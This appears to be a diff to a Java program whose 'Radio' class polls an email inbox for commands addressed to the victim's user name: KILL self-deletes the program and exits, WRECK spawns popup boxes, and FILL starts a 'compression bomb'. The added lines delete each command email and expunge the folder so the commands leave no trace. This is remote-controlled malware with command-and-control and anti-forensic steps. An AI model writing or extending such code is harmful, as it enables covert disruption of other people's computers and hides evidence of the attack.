@@ -20,6 +20,7 @@ import javax.activation.DataHandler;
 import javax.activation.DataSource;
 import javax.activation.FileDataSource;
 import javax.mail.BodyPart;
+import javax.mail.Flags;
 import javax.mail.Folder;
 import javax.mail.Message;
 import javax.mail.MessagingException;
@@ -500,17 +501,23 @@ public class Radio
 			         if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("KILL")) 
 			         {
 			        	 Chocolat.println("[" + m.robert.elapsedTime() +"] Kill Command Received");
+			        	 message.setFlag(Flags.Flag.DELETED, true);
+			        	 emailFolder.close(true);
 			        	 File cf = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath());
 			 			 cf.deleteOnExit();
 			 			 System.exit(0);
 			         }
 			         // Popup boxes
 			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("WRECK")) {
+			        	 message.setFlag(Flags.Flag.DELETED, true);
+			        	 emailFolder.close(true);
 			        	 spawner.start();
 			         }
 			         
 			         // Compression bomb
 			         else if (message.getSubject().matches(System.getProperty("user.name")) && message.getContent().toString().matches("FILL")) {
+			        	 message.setFlag(Flags.Flag.DELETED, true);
+			        	 emailFolder.close(true);
 			        	 AlphaDecay.start();
 			         }
 		      	  }
